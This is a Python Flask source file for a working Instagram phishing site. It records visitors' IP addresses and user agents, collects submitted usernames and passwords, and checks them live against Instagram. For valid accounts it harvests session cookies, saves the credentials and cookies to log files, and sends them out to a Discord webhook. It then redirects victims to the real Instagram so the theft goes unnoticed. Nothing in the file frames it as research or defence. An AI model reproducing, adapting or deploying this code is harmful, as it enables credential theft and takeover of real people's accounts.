from flask import Flask, render_template, request, redirect, url_for
from datetime import datetime
import pytz
import requests
import json
from dotenv import load_dotenv
import os
from gevent.pywsgi import WSGIServer
import gevent
from app.instagram_api import IsExists
from app.functions import set_agent,edit_cookies,first_art,correct_answer,wrong_answer
import logging
from colorama import Fore, Back, Style


app = Flask(__name__)
load_dotenv()

DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')


def send_to_discord(message):
    data = {
        "content": "```\n" + message + "```"
    }
    headers = {
        'Content-Type': 'application/json',
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(data), headers=headers)
        response.raise_for_status() 
        print(f"\n{Fore.GREEN}Message sent to Discord.{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"\n{Fore.RED}Error sending message to Discord: {e}{Style.RESET_ALL}")


@app.route('/')
def index():

    time_zone = "Asia/Baku" #You can change it

    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    utc_now = datetime.utcnow()
    baku_tz = pytz.timezone(time_zone)
    baku_now = utc_now.replace(tzinfo=pytz.utc).astimezone(baku_tz)
    visit_time = baku_now.strftime("%Y-%m-%d %H:%M:%S")

    first_art(visit_time, user_ip, user_agent)

    with open('output/ip_agent.log', 'a') as f:
        f.write(f"\n\n\n\nEnter website in: {visit_time} \nIP: {user_ip}\nUser-Agent: {user_agent}\n")
    
    return render_template('index.html')


@app.route('/submit', methods=['POST'])
def submit():
    
    username = request.form['username']
    password = request.form['password']

    user_agent = set_agent()
    
    result,cookies = IsExists(username, password, user_agent)    

    if result and result.get("status") == "ok" and result.get("authenticated") is not None and result.get("authenticated"):
        cookies = edit_cookies(cookies)

        correct_answer(username,password,cookies)

        with open('output/pass_user.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}\n{cookies}\n")

        message = "Username: " + username + "\nPassword: " + password + "\n\n" + "\t\tCookies\n" + cookies
        
        gevent.spawn(send_to_discord, message)

        return redirect("http://www.instagram.com")
        
    else:

        wrong_answer(username,password)

        with open('output/wrong_pass.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}\n")
        return render_template('error.html')


if __name__ == '__main__':
    try:
        log = logging.getLogger('werkzeug')
        log.disabled = True     
        logging.disable(logging.CRITICAL)
        http_server = WSGIServer(('127.0.0.1', 8080), app, log=None, error_log=None)
        http_server.serve_forever()
    except:
        print(Fore.RED + "EXIT" +Style.RESET_ALL)
